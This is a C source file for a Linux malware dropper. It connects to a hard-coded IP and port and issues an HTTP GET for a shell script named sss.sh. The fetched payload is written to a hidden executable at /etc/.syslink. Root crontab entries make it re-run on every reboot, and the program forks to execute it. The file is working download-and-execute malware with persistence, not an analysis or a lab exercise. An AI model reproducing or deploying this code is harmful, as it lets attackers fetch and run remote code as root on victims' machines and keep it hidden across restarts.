

#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pwd.h>
#include <errno.h>
#include <string.h>

#include "../read.h"

#define NULLPTR (void*)(0)
#define BAD     -1
#define BUFFER  1024
#define IP	 "192.168.0.199"
#define PORT	 3333
#define HTTP_TXT_OFFSET 185

char* source = "GET /sss.sh HTTP/1.1\r\nHost: %s\r\nContent-Type: text/plain\r\n\r\n";
char command[] = 
{ 
      '/', 'e', 't', 'c',
      '/', '.', 's', 'y', 's', 'l', 'i', 'n', 'k' 
};
char* resource = NULLPTR;
char eb[BUFFER];            			// Buffer to hold client
char* filecode = "#!/bin/sh\n# 7code7";
int sfd = 0;					// Socket fd
struct sockaddr_in serv;			// Server Connection struct
FILE* train = NULLPTR;

void init() { zeroarray(eb, BUFFER); }   // Initialize through buffer 0's

char reachout()
{
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd == BAD)
    	return 0;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(PORT);
    serv.sin_addr.s_addr = inet_addr(IP);

	PRINTN(serv.sin_family);
        PRINTN(serv.sin_addr.s_addr);
	PRINTN(serv.sin_port);
	PRINTN(sizeof(serv));
    
    if (connect(sfd, (struct sockaddr*)&serv, sizeof(serv)) < 0)
    	 THROW("BAD CONNECTION");
    return 1;
}

int detectcode(char* code)	// Finds my specifically designed string "# 7code7"
{
    int len = strlen(code);
    int eblen = strlen(eb);
    char* f = eb;
    char* b = eb + len;
    char hold = *b;
    int offset = 0;
    
    *b = '\0';
    while (strcmp(f, code) && offset < eblen)
    {
    	offset += 1;
    	++f;
    	*b = hold; ++b;
    	hold = *b; *b = '\0';
    }
    return offset;
}

void purify()
{
	char holder[BUFFER]; zeroarray(holder, BUFFER);
	strcpy(holder, eb);
	int i; int j = 0;
	for (i = 0; i < BUFFER; ++i)
		if (holder[i] != '\r')
		{
			eb[j] = holder[i];
			++j;
		}
}

char receive()
{
	// HTTP GET FILE HERE
	write(sfd, source, strlen(source));
	// READ IN FILE TO BUFFER HERE	
	int numbytes = 0;
	while (numbytes < BUFFER)
	{
		int check = read(sfd, eb + numbytes, BUFFER);
		if (check >= 1)
			numbytes += check;
		if (check == 0)
			break;
	}
	purify();	// Removes filthy windows characters from buffer
	return 1;
}

void placefile(char* file, char* buffer, int amt)
{
	train = fopen(file, "w+");		// Create file
        if (train)				// Write to file if open
        {
            fwrite(buffer, sizeof(char), amt, train);
            fclose(train);    
        }
        chmod(file, 0755);			// Make file executable
}

void makexecutable()	// Establishes persistance
{
	int offset = detectcode(filecode);
	char* cronholder = "@reboot  sleep 60;/etc/.syslink\n";
        placefile(command, eb + offset, BUFFER);			// Make file executable
        placefile("/var/spool/cron/root", cronholder, strlen(cronholder));		// Place file in cron		// Fedora and CentOS
        placefile("/var/spool/cron/crontabs/root", cronholder, strlen(cronholder));  // Place file in crontabs	// Debian and Ubuntu
}

void execute()
{
    if (fork() != 0)
    	return;
    else
    {
    	char* args[] = { command, resource };
    	execv(args[0], args);				// Execute script over this program
    }
}

int main()
{
    init();					// Initialize 'eb' buffer
    if (reachout())				// Alert server and capture payload
        if (receive())
 	{ 
 		makexecutable();
   		execute();		
  	}
    //remove("a.out");
}










/*/ Net
	if (argc == 1)
		gatekeeper();
	else
		enterportal();
/*/
